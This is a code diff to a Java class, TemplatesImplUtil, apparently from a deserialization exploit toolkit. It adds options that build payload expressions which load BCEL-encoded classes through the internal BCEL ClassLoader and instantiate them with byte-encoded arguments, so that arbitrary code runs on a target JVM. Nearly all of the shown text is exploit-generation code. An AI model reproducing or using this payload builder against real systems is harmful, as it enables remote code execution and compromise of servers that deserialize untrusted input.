@@ -63,6 +63,16 @@ public class TemplatesImplUtil {
             String bcelClassFile = command.substring(CustomCommand.COMMAND_BCEL_CLASS_FILE.length());
             String strBCEL = HackBCELs.encode(bcelClassFile);
             cmd  = String.format("new com.sun.org.apache.bcel.internal.util.ClassLoader().loadClass(\"%s\").newInstance();",strBCEL);
+        } else if(command.toLowerCase().startsWith(CustomCommand.COMMAND_BCEL_WITH_ARGS)){
+            String tmp = command.substring(CustomCommand.COMMAND_BCEL_WITH_ARGS.length());
+            String bcelStr = tmp.split("\\|")[0] ;
+            String bcelArgs = tmp.split("\\|")[1];
+            cmd  = String.format("new com.sun.org.apache.bcel.internal.util.ClassLoader().loadClass(\"%s\").getConstructor(new Class[]{String.class}).newInstance(new String[]{new String(new byte[]{%s})});",bcelStr,CommonUtil.stringToByteArrayString(bcelArgs));
+        } else if(command.toLowerCase().startsWith(CustomCommand.COMMAND_BCEL_CLASS_FILE_WITH_ARGS)){
+            String tmp = command.substring(CustomCommand.COMMAND_BCEL_CLASS_FILE_WITH_ARGS.length());
+            String bcelStr = HackBCELs.encode(tmp.split("\\|")[0]);
+            String bcelArgs = tmp.split("\\|")[1];
+            cmd  = String.format("new com.sun.org.apache.bcel.internal.util.ClassLoader().loadClass(\"%s\").getConstructor(new Class[]{String.class}).newInstance(new String[]{new String(new byte[]{%s})});",bcelStr,CommonUtil.stringToByteArrayString(bcelArgs));
         } else if (command.toLowerCase().startsWith(CustomCommand.COMMAND_SCRIPT_FILE)){
             String scriptFilePath = command.substring(CustomCommand.COMMAND_SCRIPT_FILE.length());
             String scriptFileByteCode = CommonUtil.byteToByteArrayString(CommonUtil.readFileByte(scriptFilePath));
